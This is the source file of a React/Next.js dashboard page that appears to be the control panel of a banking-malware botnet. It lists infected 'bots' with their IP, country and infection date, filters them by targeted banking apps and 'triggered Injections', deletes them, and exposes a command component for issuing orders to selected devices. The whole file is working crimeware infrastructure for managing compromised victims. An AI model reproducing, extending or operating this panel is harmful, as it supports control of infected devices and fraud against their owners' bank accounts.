import React, { useCallback, useRef, useMemo, useReducer, useState, useEffect } from 'react';
import Head from 'next/head';
import { Box, Button, Select,ThemeProvider, InputLabel, MenuItem, ListItemIcon, InputAdornment, OutlinedInput, Container, Stack, Card, CardHeader, CardActions, Divider, CardContent, SvgIcon, Grid, FormControlLabel, Typography, Checkbox, Link } from '@mui/material';
import { useSelection } from 'src/hooks/use-selection';
import { Layout as DashboardLayout } from 'src/layouts/dashboard/layout';
import { CustomersTable } from 'src/sections/customer/customers-table';
import { Commands } from 'src/sections/customer/commands';
import { applyPagination } from 'src/utils/apply-pagination';
import { formatTime } from 'src/utils/formattime';
import SettingsContext from '../settings';
import $ from 'jquery';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faArrowLeft, faSortDown, faSortUp, faTrashCan } from '@fortawesome/free-solid-svg-icons';
import countryData from '../sections/customer/countrydata.json';
import { checkperms } from 'src/utils/checkperms';
import { useRouter } from 'next/router';
import { toast } from 'react-toastify';
import TagInput from 'src/sections/customer/taginput';

const now = new Date();



function replaceNthCharWith(str, newChar, index) {
  if (index >= str.length) {
    return str;
  } else {
    return str.substr(0, index) + newChar + str.substr(index + 1);
  }
}

const useCustomerIds = (customers) => {
  return useMemo(
    () => {
      return customers.map((customer) => customer.id);
    },
    [customers]
  );
};

const Page = () => {
  const router = useRouter();
  const { botid } = router.query;

  let data = [];
  const [page, setPage] = useState(0);
  const [rowsPerPage, setRowsPerPage] = useState(5);
  const [customers, setCustomers] = useState(applyPagination(data, page, rowsPerPage));
  const customersIds = useCustomerIds(customers);
  const customersSelection = useSelection(customersIds);
  const [showOptions, setShowOptions] = useState(false);
  const [showFilterCountry, setShowFilterCountry] = useState(false);

  // filtering options

  const [statusFilter, setStatusFilter] = useState(1)
  const [bankFilter, setBankFilter] = useState(12)

  const [statusFiltered, setStatusFiltered] = useState(false)
  const [appsFiltered, setAppsFiltered] = useState(false)

  const [selectedCountry, setselectedCountry] = useState('');
  const countRef = useRef(0);

  const menuPaperStyle = {
    maxHeight: 200,
    '& ul': {
      padding: 0,
      margin: 0,
    },
  };

  useEffect(() => {
    if (!checkperms(4)) {
      return
    }
    newCustomers()
    SettingsContext.SelectedBots = [];

    if (SettingsContext.autoUpdateEnable) {
      const interval = setInterval(() => {
        countRef.current++;
        newCustomers()
      }, 10000);
  
      return () => clearInterval(interval);
    }

    

  }, []);

  function checkfiltermode(n) {
    n = n - 1 
  
    const character = SettingsContext.BotsFilterMode[n];
  
    if (character === '1') {
      return true;
    } else if (character === '0') {
      return false;
    }
  }

  const handleBlurBankSearch = () => {
    console.log("tzest")
    newCustomers();
  }

  const handleCountry = (event) => {
    setselectedCountry(event.target.value);
    SettingsContext.FindbyCountry = countryData[event.target.value].abbreviation
    SettingsContext.BotsFilterMode = replaceNthCharWith(SettingsContext.BotsFilterMode, "1", 8)
    newCustomers()
  };

  
  const deletebots = async () => {
    let request = $.ajax({
      type: 'POST',
      url: SettingsContext.restApiUrl,
      data: {
         'params': new Buffer('{"request":"deleteBots","idbot":"' + SettingsContext.SelectedBots.join(",") + '","password":"' + SettingsContext.password + ' "}').toString('base64')
        }
    });

    request.done(function(msg) {
      if(JSON.parse(msg).message === "ok") {
        if (SettingsContext.SelectedBots.length > 1) {
          toast.success("Deleted bots " + SettingsContext.SelectedBots.join(",") + " from Panel")
        } else {
          toast.success("Deleted bot " + SettingsContext.SelectedBots.join(",") + " from Panel")
        }
      } else {
        toast.error("Erorr deleting bots")
      }
      SettingsContext.SelectedBots = [];
      newCustomers()
    }.bind(this));
  }

  const newCustomers = async () => {
    if (botid) {
      SettingsContext.FindByID = botid;
      console.log(botid)
    }

    let request = $.ajax({
      type: 'POST',
      url: SettingsContext.restApiUrl,
      data: {
          'params':  new Buffer ('{"request":"getBots","currentPage":"1","sorting":"' + SettingsContext.BotsFilterMode + '","botsperpage":"100000","countrycode":"' + SettingsContext.FindbyCountry + '","findbyid":"' + botid + '","findbybank":"' + SettingsContext.FindByBank + '","password":"' + SettingsContext.password + ' "}').toString('base64')
      }
    });

    request.done(function(msg) {
      let response = (JSON.parse(msg))
      let responsedata = response.bots
      var data = [];

      responsedata.forEach((stats) => {
        const { id, country, version, ip, lastConnect, tag, banks, comment, dateInfection } = stats;
        const formattedTime = formatTime(lastConnect);
        const commentDecoded = atob(comment)

        //console.log(lastConnect)
        let online = lastConnect <= 120;

        if (botid) {
          if ((SettingsContext.user.tag === tag || SettingsContext.user.tag === "ALL") && id === botid ){
            data.push({  id, country, version, ip, lastConnect: formattedTime, tag, banks, comment: commentDecoded, dateInfection, online });
          }
        } else {
          if ((SettingsContext.user.tag === tag || SettingsContext.user.tag === "ALL")){
            data.push({  id, country, version, ip, lastConnect: formattedTime, tag, banks, comment: commentDecoded, dateInfection, online });
          }
        }

      });


      setCustomers(applyPagination(data, SettingsContext.CurrentPage, SettingsContext.RowsPerPage))
      SettingsContext.CountBots = data.length
      
    }.bind(this));
 
  };

  const refreshPage = () => {
    data = [];
    SettingsContext.CurrentPage = 0
    setPage(0);
    newCustomers();
  };

  const handleButtonClick = () => {
    setShowOptions(!showOptions);
  };

  const handlePageChange = useCallback(
    (event, value) => {
      setPage(value);
      SettingsContext.CurrentPage = value
      newCustomers()
    },
    []
  );



  const handleRowsPerPageChange = useCallback(
    (event) => {
      setRowsPerPage(event.target.value);
      SettingsContext.RowsPerPage = event.target.value
      SettingsContext.CurrentPage = 0
      setPage(0);
      newCustomers()
    },
    []
  );

    if (!checkperms(4)){
      return (
        <>
            <Head>
              <title>
                Bots
              </title>
            </Head>
            <Box
              component="main"
              sx={{
                flexGrow: 1,
                py: 8
              }}
            >
              <Container maxWidth="xl">
                <Stack spacing={3}>
                  <div>
                  <Link href="/" style={{ textDecoration: 'none' }}>
                      <Button
                        startIcon={(
                          <FontAwesomeIcon icon={faArrowLeft} />
                        )}
                        variant="contained"
                      >
                        Back
                      </Button>
                  </Link>
                  </div>
                  <center><Typography fontSize={32}>You arent allowed here</Typography></center>
                  </Stack>
                  </Container>
            </Box>
        </>
      )
    }

      return (
        <>
          <Head>
            <title>
              Bots
            </title>
          </Head>
          <Box
            component="main"
            sx={{
              flexGrow: 1,
              py: 8
            }}
          >
            <Container maxWidth="xl">
              <Stack spacing={3}>
                <Stack
                  direction="row"
                  justifyContent="space-between"
                  spacing={4}
                >
                  <Stack spacing={1}>
                    <Typography variant="h4">
                      Bots
                    </Typography>
                    <Stack
                      alignItems="center"
                      direction="row"
                      spacing={1}
                    >
                    </Stack>
                  </Stack>
                  <div>
                    <Button
                      disabled={SettingsContext.user.role === "user"}
                      onClick={deletebots}
                      startIcon={(
                        <FontAwesomeIcon icon={faTrashCan} />
                      )}
                      variant="contained"
                    >
                      Delete Selected
                    </Button>
                  </div> 
                </Stack>
    
                <Button variant="contained" color="primary" onClick={handleButtonClick}>
                  {showOptions ? 'Hide Filters' : 'Show Filters'}
                </Button>
    
                {showOptions && (
                  <Card sx={{ p: 3.5 }}>
                  <Grid container spacing={2} alignItems="flex-start">
                    <Grid item md={4} sm={12} xs={12}>
                      <Stack spacing={1}>
                        <Stack>
                        <FormControlLabel control={                      <Checkbox defaultChecked={checkfiltermode(1)}
                            onChange={(event) => {
                              if (event.target.checked) {
                                SettingsContext.BotsFilterMode = replaceNthCharWith(SettingsContext.BotsFilterMode, "1", 0)
                                data = [];
                                newCustomers()
                              } else {
                                SettingsContext.BotsFilterMode = replaceNthCharWith(SettingsContext.BotsFilterMode, "0", 0)
                                data = [];
                                newCustomers()
                              }
                            }}
                            />} label="Only Online Bots" />
                        <FormControlLabel control={                      <Checkbox defaultChecked={checkfiltermode(2)}
                            onChange={(event) => {
                              if (event.target.checked) {
                                SettingsContext.BotsFilterMode = replaceNthCharWith(SettingsContext.BotsFilterMode, "1", 1)
                                data = [];
                                newCustomers()
                              } else {
                                SettingsContext.BotsFilterMode = replaceNthCharWith(SettingsContext.BotsFilterMode, "0", 1)
                                data = [];
                                newCustomers()
                              }
                            }}
                            />} label="Only Offline Bots" />
                        <FormControlLabel control={                      <Checkbox defaultChecked={checkfiltermode(3)}
                            onChange={(event) => {
                              if (event.target.checked) {
                                SettingsContext.BotsFilterMode = replaceNthCharWith(SettingsContext.BotsFilterMode, "1", 2)
                                data = [];
                                newCustomers()
                              } else {
                                SettingsContext.BotsFilterMode = replaceNthCharWith(SettingsContext.BotsFilterMode, "0", 2)
                                data = [];
                                newCustomers()
                              }
                            }}
                            />} label="Only dead Bots" />
                        </Stack>
                      </Stack>
                    </Grid>
                    <Grid item md={4} sm={12} xs={12}>
                      <Stack spacing={1}>
                        <Stack>
                        <FormControlLabel control={                      <Checkbox defaultChecked={checkfiltermode(4)}
                            onChange={(event) => {
                              if (event.target.checked) {
                                SettingsContext.BotsFilterMode = replaceNthCharWith(SettingsContext.BotsFilterMode, "1", 3)
                                data = [];
                                newCustomers()
                              } else {
                                SettingsContext.BotsFilterMode = replaceNthCharWith(SettingsContext.BotsFilterMode, "0", 3)
                                data = [];
                                newCustomers()
                              }
                            }}
                            />} label="Only Bots with banks" />
                        <FormControlLabel control={                      <Checkbox defaultChecked={checkfiltermode(5)}
                            onChange={(event) => {
                              if (event.target.checked) {
                                SettingsContext.BotsFilterMode = replaceNthCharWith(SettingsContext.BotsFilterMode, "1", 4)
                                data = [];
                                newCustomers()
                              } else {
                                SettingsContext.BotsFilterMode = replaceNthCharWith(SettingsContext.BotsFilterMode, "0", 4)
                                data = [];
                                newCustomers()
                              }
                            }}
                            />} label="Only bots without banks" />
                        <FormControlLabel control={                      <Checkbox defaultChecked={checkfiltermode(6)}
                            onChange={(event) => {
                              if (event.target.checked) {
                                SettingsContext.BotsFilterMode = replaceNthCharWith(SettingsContext.BotsFilterMode, "1", 5)
                                data = [];
                                newCustomers()
                              } else {
                                SettingsContext.BotsFilterMode = replaceNthCharWith(SettingsContext.BotsFilterMode, "0", 5)
                                data = [];
                                newCustomers()
                              }
                            }}
                            />} label="Only Bots with triggered Injections" />
                        </Stack>
                      </Stack>
                    </Grid>

                    <Grid item md={4} sm={12} xs={12}>
                      <Stack spacing={1}>
                        <Stack>
                        <FormControlLabel control={                      <Checkbox defaultChecked={checkfiltermode(9)}
                            onChange={(event) => {
                              if (event.target.checked) {
                                setShowFilterCountry(true)
                                SettingsContext.BotsFilterMode = replaceNthCharWith(SettingsContext.BotsFilterMode, "1", 8)
                                newCustomers()
                              } else {
                                setShowFilterCountry(false)
                                SettingsContext.BotsFilterMode = replaceNthCharWith(SettingsContext.BotsFilterMode, "0", 8)
                                newCustomers()
                              }
                            }}
                            />} label="Filter by country" />
                          {showFilterCountry && <Box display="inline-block" ml={25} mt={-6} width={100} height={90}>
                          <Select
                            style={{minWidth: "200px"}}
                            value={selectedCountry}
                            onChange={handleCountry}
                            displayEmpty
                            MenuProps={{ PaperProps: { style: menuPaperStyle } }}
                            renderValue={(value) => countryData[value]?.country}
                          >
                            {countryData.map((option, index) => (
                              <MenuItem key={index} value={index}>
                                <td><img src={`/assets/flag/${option.abbreviation.toLowerCase()}.png`}/></td><Typography ml={2} noWrap>{option.country}</Typography>
                              </MenuItem>
                            ))}
                          </Select></Box>}
                          <FormControlLabel control={                      <Checkbox defaultChecked={checkfiltermode(11)}
                            onChange={(event) => {
                              if (event.target.checked) {
                                SettingsContext.BotsFilterMode = replaceNthCharWith(SettingsContext.BotsFilterMode, "1", 10)
                                data = [];
                                newCustomers()
                              } else {
                                SettingsContext.BotsFilterMode = replaceNthCharWith(SettingsContext.BotsFilterMode, "0", 10)
                                data = [];
                                newCustomers()
                              }
                            }}
                            />} label="Order by oldest" />
                            <FormControlLabel control={                      <Checkbox defaultChecked={checkfiltermode(12)}
                            onChange={(event) => {
                              if (event.target.checked) {
                                SettingsContext.BotsFilterMode = replaceNthCharWith(SettingsContext.BotsFilterMode, "1", 11)
                                data = [];
                                newCustomers()
                              } else {
                                SettingsContext.BotsFilterMode = replaceNthCharWith(SettingsContext.BotsFilterMode, "0", 11)
                                data = [];
                                newCustomers()
                              }
                            }}
                            />} label={"Filter by apps"} />

                            <TagInput refresh={refreshPage}></TagInput>
                        </Stack>
                      </Stack>
                    </Grid>
                  </Grid>
                  </Card>
                )}

                <Card sx={{ p: 3.5 }}>
                  <CardContent style={{    
                      display: 'flex',
                      flexDirection: 'row',
                      justifyContent: 'space-between',
                      alignItems: 'center',}}>
                        <Button
                        style={{
                          borderRadius: 10,
                          height: 50,
                          minWidth: 50,
                          width: 50,
                          color: 'white',
                          borderColor: "black",
                          backgroundColor: '#f6b13c',
                          border: '3px solid #000000',
                        }}
                        onClick={()=> {
                          if (!checkfiltermode(11)) {
                            SettingsContext.BotsFilterMode = replaceNthCharWith(SettingsContext.BotsFilterMode, "1", 10)
                            console.log(SettingsContext.BotsFilterMode)
                            data = [];
                            newCustomers()
                          } else {
                            SettingsContext.BotsFilterMode = replaceNthCharWith(SettingsContext.BotsFilterMode, "0", 10)
                            console.log(SettingsContext.BotsFilterMode)
                            data = [];
                            newCustomers()
                          }
                        }}
                        variant={'outlined'}
                      >
                        {checkfiltermode(11) ? <FontAwesomeIcon icon={faSortUp} size="2x" color='#000000'/> : <FontAwesomeIcon icon={faSortDown} size="2x" color='#000000'/>}
                        
                      </Button>

                        <div>
                        <FormControlLabel
                          control={<Checkbox 
                            defaultChecked={checkfiltermode(1) || checkfiltermode(2) || checkfiltermode(3)}
                          onChange={(event) => {
                            SettingsContext.BotsFilterMode = replaceNthCharWith(SettingsContext.BotsFilterMode, event.target.checked ? "1" : "0", statusFilter - 1)
                            console.log(SettingsContext.BotsFilterMode)
                            setStatusFiltered(true)
                            refreshPage();
                          }}
                          />}
                          label="Status"
                        />
                        <Select
                          sx={{width: "100px"}}
                          defaultValue={statusFilter}
                          onChange={(event) => {
                            console.log('Selected option:', event.target.value);
                            setStatusFilter(event.target.value);
                            if(statusFiltered) {
                              SettingsContext.BotsFilterMode = replaceNthCharWith(SettingsContext.BotsFilterMode, "0", 0)
                              SettingsContext.BotsFilterMode = replaceNthCharWith(SettingsContext.BotsFilterMode, "0", 1)
                              SettingsContext.BotsFilterMode = replaceNthCharWith(SettingsContext.BotsFilterMode, "0", 2)
                              SettingsContext.BotsFilterMode = replaceNthCharWith(SettingsContext.BotsFilterMode, event.target.checked ? "0" : "1", event.target.value -1)
                            }
                            console.log(SettingsContext.BotsFilterMode)
                            refreshPage();
                          }}>
                          <MenuItem value="1">Online</MenuItem>
                          <MenuItem value="2">Offline</MenuItem>
                          <MenuItem value="3">Dead</MenuItem>
                        </Select>
                        </div>

                        <div>
                        <FormControlLabel
                          control={<Checkbox 
                            defaultChecked={checkfiltermode(4) || checkfiltermode(5) || checkfiltermode(6)}
                          onChange={(event) => {
                            SettingsContext.BotsFilterMode = replaceNthCharWith(SettingsContext.BotsFilterMode, event.target.checked ? "1" : "0", bankFilter -1)
                            console.log(SettingsContext.BotsFilterMode)
                            refreshPage();
                          }}
                          />}
                          label="Apps"
                        />
                        <Select
                          sx={{width: "150px"}}
                          defaultValue={bankFilter}
                          onChange={(event) => {
                            console.log('Selected option:', event.target.value);
                            setBankFilter(event.target.value);
                            if(appsFiltered) {
                              SettingsContext.BotsFilterMode = replaceNthCharWith(SettingsContext.BotsFilterMode, "0", 3)
                              SettingsContext.BotsFilterMode = replaceNthCharWith(SettingsContext.BotsFilterMode, "0", 4)
                              SettingsContext.BotsFilterMode = replaceNthCharWith(SettingsContext.BotsFilterMode, "0", 11)
                              SettingsContext.BotsFilterMode = replaceNthCharWith(SettingsContext.BotsFilterMode, event.target.checked ? "0" : "1", event.target.value -1)
                            }
                            console.log(SettingsContext.BotsFilterMode)
                            refreshPage();
                          }}>
                          <MenuItem value="12">Specific apps</MenuItem>
                          <MenuItem value="4">Target apps</MenuItem>
                          <MenuItem value="5">No target apps</MenuItem>
                        </Select>
                        </div>
                        {checkfiltermode(12) && bankFilter === "12" && (
                          <TagInput refresh={refreshPage}></TagInput>
                        )}

                        <FormControlLabel control={                      <Checkbox defaultChecked={checkfiltermode(9)}
                            onChange={(event) => {
                              if (event.target.checked) {
                                setShowFilterCountry(true)
                                SettingsContext.BotsFilterMode = replaceNthCharWith(SettingsContext.BotsFilterMode, "1", 8)
                                newCustomers()
                              } else {
                                setShowFilterCountry(false)
                                SettingsContext.BotsFilterMode = replaceNthCharWith(SettingsContext.BotsFilterMode, "0", 8)
                                newCustomers()
                              }
                            }}
                            />} label="Filter by country" />
                          {showFilterCountry && <Box>
                          <Select
                            style={{minWidth: "200px"}}
                            value={selectedCountry}
                            onChange={handleCountry}
                            displayEmpty
                            MenuProps={{ PaperProps: { style: menuPaperStyle } }}
                            renderValue={(value) => countryData[value]?.country}
                          >
                            {countryData.map((option, index) => (
                              <MenuItem key={index} value={index}>
                                <td><img src={`/assets/flag/${option.abbreviation.toLowerCase()}.png`}/></td><Typography ml={2} noWrap>{option.country}</Typography>
                              </MenuItem>
                            ))}
                          </Select></Box>}
                  </CardContent>
                  </Card>

                <CustomersTable
                  count={SettingsContext.CountBots}
                  items={customers}
                  onDeselectAll={customersSelection.handleDeselectAll}
                  onDeselectOne={customersSelection.handleDeselectOne}
                  onPageChange={handlePageChange}
                  onRowsPerPageChange={handleRowsPerPageChange}
                  onSelectAll={customersSelection.handleSelectAll}
                  onSelectOne={customersSelection.handleSelectOne}
                  page={page}
                  rowsPerPage={rowsPerPage}
                  selected={customersSelection.selected}
                />
                
                {checkperms(5) ?
                <Commands
                  count={SettingsContext.CountBots}
                  items={customers}
                  onDeselectAll={customersSelection.handleDeselectAll}
                  onDeselectOne={customersSelection.handleDeselectOne}
                  onPageChange={handlePageChange}
                  onRowsPerPageChange={handleRowsPerPageChange}
                  onSelectAll={customersSelection.handleSelectAll}
                  onSelectOne={customersSelection.handleSelectOne}
                  page={page}
                  rowsPerPage={rowsPerPage}
                  selected={customersSelection.selected}
                />
              : null}

                

              </Stack>
            </Container>
          </Box>
        </>
      );
    }

Page.getLayout = (page) => (
  <DashboardLayout>
    {page}
  </DashboardLayout>
);

export default Page;
